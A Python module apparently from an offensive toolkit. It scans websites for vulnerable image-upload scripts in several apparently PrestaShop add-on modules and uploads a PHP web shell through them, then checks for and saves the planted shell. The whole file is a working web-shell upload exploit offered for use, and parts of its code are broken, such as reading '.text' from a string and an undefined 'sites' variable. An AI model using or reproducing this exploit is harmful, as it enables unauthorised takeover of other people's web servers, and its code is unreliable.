#!/usr/bin/python3
########################################
# Github : http://github.com/galehrizky#
# Facebook : Galeh Rizky               #
# Email : galehrizky@codelatte.org     #
# visit : c0delabs.com                 #
# this module created by galeh rizky   #
########################################

import requests
import json
import sys
import time
import re
from galer.module import save
from termcolor import colored

def green(str):
  return colored(str, "green")

def blue(str):
  return colored(str, "blue")

def red(str):
  return colored(str, "red")

def payload():
	payloads = [
	'/modules/columnadverts/uploadimage.php',
	'/modules/homepageadvertise/uploadimage.php',
	'/modules/productpageadverts/uploadimage.php',
	'/modules/simpleslideshow/uploadimage.php',
	'/modules/vtemslideshow/uploadimage.php',
	]
	return payloads

def exploit(sites):
	try:
		header = {
		'user-agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)'
			'AppleWebKit/537.36 (KHTML, like Gecko)'
			'Chrome/45.0.2454.101 Safari/537.36'),
		'referer': sites
		}

		response = requests.get(sites, headers=header, allow_redirects=False,timeout=15).content.decode('utf-8')
		if "error" in response:
			print(green("[+] Website or Modules Maybe vuln => {}".format(sites)))
			print(blue("[?] Try to upload shell ..."))
			time.sleep(1)
			files = {'userfile' : open('../shell/dt.php', 'rb')}
			url = sites
			r = requests.post(url, files=files, timeout=5)
			if "success" in r.content.decode('utf-8'):
				print(blue("[?] Cek shell ..."))
				shell = url.replace("uploadimage.php", "")+"slides/up.php"
				if 'PWDxD3pTeam' in shell.text:
					save(shell)
					print(green("[+] Success upload shell => {}".format(shell)))
				else:
					print(red("[-] Opps sorry :( => {}".format(shell)))
			else:
				print(red("[-] Failed To Upload shell :("))
		else:
			print(red("[-] Website or modules not vuln => {}".format(sites)))

	except Exception as e:
			print(red("[!] Something Wrong ! => {}".format(sites)))

def go_exploit():
	try:
		for payloads in payload():
			exploit(sites+payloads)
	except KeyboardInterrupt as e:
		print("[!] Ctrl + C detect exit ...")
		sys.exit()